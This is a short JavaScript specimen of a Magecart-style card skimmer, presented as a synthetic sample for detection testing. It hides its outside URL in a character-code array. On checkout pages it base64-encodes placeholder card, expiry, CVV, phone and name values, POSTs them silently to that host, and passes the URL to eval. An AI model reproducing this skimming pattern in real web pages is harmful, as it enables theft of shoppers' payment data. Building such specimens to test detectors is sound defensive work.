// Synthetic Convertr Magecart skimmer specimen
// Reconstructed from Sansec research for detection testing
(function(){
  var _a=[104,116,116,112,115,58,47,47,49,120,48,46,105,115,47,119,115];
  var _s="";
  for(var _i=0;_i<_a.length;_i++){_s+=String.fromCharCode(_a[_i]);}
  if(window.location.href.indexOf("checkout")>-1){
    var D={c:"4111111111111111",m:"12",y:"28",v:"123",p:"12345678901",n:"Test"};
    var payload=D.c+"|"+D.m+"|"+D.y+"|"+D.v+"|"+D.p+"|"+D.n+"|ctr";
    fetch(_s,{method:"POST",body:btoa(payload),mode:"no-cors",keepalive:true});
    (0,eval)(_s);
  }
})();
